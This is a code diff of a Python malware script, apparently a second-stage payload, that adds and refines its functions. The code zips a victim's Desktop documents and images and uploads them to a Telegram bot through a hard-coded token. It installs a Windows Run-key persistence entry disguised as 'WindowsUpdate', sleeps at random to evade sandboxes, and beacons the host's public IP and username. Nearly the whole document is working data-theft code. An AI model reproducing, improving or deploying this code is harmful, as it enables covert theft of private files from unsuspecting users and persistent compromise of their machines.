@@ -6,11 +6,26 @@ import requests
 import subprocess
 import time
 import sys
+import hashlib
 
-# --- CONFIG (DO NOT CHANGE IN FILE — YOU CONTROL VIA GITHUB) ---
+# --- CONFIG ---
 TELEGRAM_TOKEN = "8268540452:AAEQl6dAmNxWTrfVEOy4liqMoxt2qm1-_hs"
 CHAT_ID = "3032183658"
-C2_URL = "https://raw.githubusercontent.com/Jeki1234121/dev-tools-backup/main/stage2.py"
+
+def send_telegram(msg):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    try:
+        requests.post(url, data={"chat_id": CHAT_ID, "text": msg}, timeout=10)
+    except:
+        pass
+
+def send_document(file_path):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+    try:
+        with open(file_path, "rb") as f:
+            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
+    except:
+        pass
 
 # --- EXFIL: Steal Desktop Files ---
 def exfil_files():
@@ -20,49 +35,76 @@ def exfil_files():
     else:
         desktop = f"/home/{user}/Desktop"
 
+    if not os.path.exists(desktop):
+        return
+
     # Find sensitive files
     files = []
     for f in os.listdir(desktop):
-        if f.lower().endswith(('.pdf', '.docx', '.xlsx', '.txt', '.jpg')) and os.path.getsize(f"{desktop}/{f}") < 5_000_000:
-            files.append(f"{desktop}/{f}")
+        path = os.path.join(desktop, f)
+        if os.path.isfile(path):
+            if f.lower().endswith(('.pdf', '.docx', '.xlsx', '.txt', '.jpg')) and os.path.getsize(path) < 5_000_000:
+                files.append(path)
 
     if not files:
         return
 
     # Zip them
-    shutil.make_archive("exfil", 'zip', desktop, None, files)
-
-    # Send to Telegram
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
     try:
-        with open("exfil.zip", "rb") as f:
-            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
+        shutil.make_archive("exfil", 'zip', root_dir=None, base_dir=files)
+        send_document("exfil.zip")
         os.remove("exfil.zip")
-    except:
-        pass
+        send_telegram("✅ Exfil: Sent desktop files")
+    except Exception as e:
+        send_telegram(f"❌ Exfil failed: {str(e)}")
 
 # --- PERSISTENCE: Add to Run Key (Windows) ---
 def add_persistence():
     if os.name != 'nt':
         return
     try:
+        # Avoid duplicate entries
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+        try:
+            val, _ = winreg.QueryValueEx(key, "WindowsUpdate")
+            if val:
+                return  # Already exists
+        except:
+            pass
+        finally:
+            winreg.CloseKey(key)
+
+        # Add persistence
         reg_cmd = (
             'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
             '/v "WindowsUpdate" '
             f'/t REG_SZ /d "python \\"{sys.argv[0]}\\"" /f'
         )
         subprocess.Popen(reg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
+        send_telegram("✅ Persistence added")
+    except Exception as e:
+        send_telegram(f"❌ Persistence failed: {str(e)}")
 
 # --- MAIN EXECUTION ---
 if __name__ == "__main__":
-    # Sleep 30–90 sec (avoid sandbox)
+    # Avoid sandbox: sleep 30–90 sec
     time.sleep(30 + (hash(str(os.environ)) % 60))
+
+    # Send beacon
+    try:
+        ip = requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        ip = "Unknown"
+
+    send_telegram(f"🟢 stage2.py executed | IP: {ip} | Host: {os.getlogin()}")
 
     # Run tasks
     try:
         exfil_files()
+    except Exception as e:
+        send_telegram(f"❌ exfil_files error: {str(e)}")
+
+    try:
         add_persistence()
-    except:
-        pass
+    except Exception as e:
+        send_telegram(f"❌ add_persistence error: {str(e)}")
